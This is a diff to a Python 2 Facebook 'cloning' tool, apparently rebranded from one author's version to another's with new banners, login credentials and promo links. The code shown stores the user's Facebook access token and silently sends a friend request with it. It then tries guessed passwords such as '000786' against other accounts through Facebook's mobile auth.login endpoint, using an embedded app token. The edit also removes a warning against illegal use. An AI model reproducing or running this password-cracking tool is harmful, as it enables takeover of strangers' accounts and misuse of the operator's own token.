@@ -37,24 +37,23 @@ def jalan(z):
 		time.sleep(00000.1)
 ##### LOGO #####
 logo = """
- _     _          ___         _
- | \   / |       |  __ \     | |
- | \   / |_ __   | |  | |    | |
- | |\ /| | '_|   | |  | |    | |
- | |   | | |     | |__| | |__| |
- |_|   |_|_|     |_____/  \___/
- 
-\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mDJ
-\033[1;96mYouTube \033[1;93m: \033[1;92mAnonymous Trickers
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/FAKHAR143/Mr_DJ
-\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/Anonymoustricker1
-\033[1;91m======================================="""
+___  ____   _ _____ _   __  ___   _   _ 
+|  \/  | | | /  ___| | / / / _ \ | \ | |
+| .  . | | | \ `--.| |/ / / /_\ \|  \| |
+| |\/| | | | |`--. \    \ |  _  || . ` |
+| |  | | |_| /\__/ / |\  \| | | || |\  |
+\_|  |_/\___/\____/\_| \_/\_| |_/\_| \_/
+\033[1;97m=======================================
+\033[1;91mOWNER  \033[1;93m: \033[1;92mJAM SHAHRUKH X MUSKAN NOOR
+\033[1;91mYouTube \033[1;93m: \033[1;92mJAM SHAHRUKH TECHNICAL
+\033[1;91mGitHub  \033[1;93m: \033[1;92mhttps://github.com/muskanckg
+\033[1;91mGANG \033[1;93m: \033[1;92mCRAZY KING GANG
+\033[1;97m======================================="""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		
-		print("\r\033[1;96m \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m \x1b[1;93mPlease Wait \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 back = 0
 berhasil = []
 cekpoint = []
@@ -64,16 +63,16 @@ listgrup = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 os.system("clear")
-print "\033[1;96m ========================================="
-print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mDJ
-\033[1;96mYouTube \033[1;93m: \033[1;92mAnonymous Trickers
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/FAKHAR143/Mr_DJ
-\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/Anonymoustricker1
-\033[1;91m======================================="""
-print " \x1b[1;93m============================================================="
-CorrectUsername = "DJDJDJ"
-CorrectPassword = "DJDJDJ"
+print "\033[1;97m ========================================="
+print  """\033[1;97m=======================================
+\033[1;91mOWNER  \033[1;93m: \033[1;92mJAM SHAHRUKH X MUSKAN NOOR
+\033[1;91mYouTube \033[1;93m: \033[1;92mJAM SHAHRUKH TECHNICAL
+\033[1;91mGitHub  \033[1;93m: \033[1;92mhttps://github.com/muskanckg
+\033[1;91mGANG \033[1;93m: \033[1;92mCRAZY KING GANG
+\033[1;97m======================================="""
+print " \x1b[1;97m==========================================="
+CorrectUsername = "jam"
+CorrectPassword = "muskan"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
@@ -84,10 +83,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+            os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
 def login():
 	os.system('clear')
 	try:
@@ -96,7 +95,7 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		print " ONLY LOGIN NEW FB ACCOUNT . IF YOU DONT HAVE MAKE IT FIRST "
+		print " ONLY LOGIN NEW FB ACCOUNT . "
 		print 42*"\033[1;96m="
 		print('\033[1;96m\x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m' )
 		id = raw_input('\033[1;96m \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
@@ -128,7 +127,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -175,7 +174,7 @@ def menu():
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH DJ"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH CKG"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
 def pilih():
@@ -266,7 +265,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m \x1b[1;93mTo Stop Process Press CTRL Then Press z . WAMIMG DONT USE THESE COMMANDS FOR ILLEGALL PURPOSE')
+	print('\x1b[1;96m \x1b[1;93mTo Stop Process Press CTRL Then Press z .')
 	print 42*"\033[1;96m="
 	
 			
@@ -366,7 +365,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = b['first_name'] + '1122'
+															pass7 = '000786'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
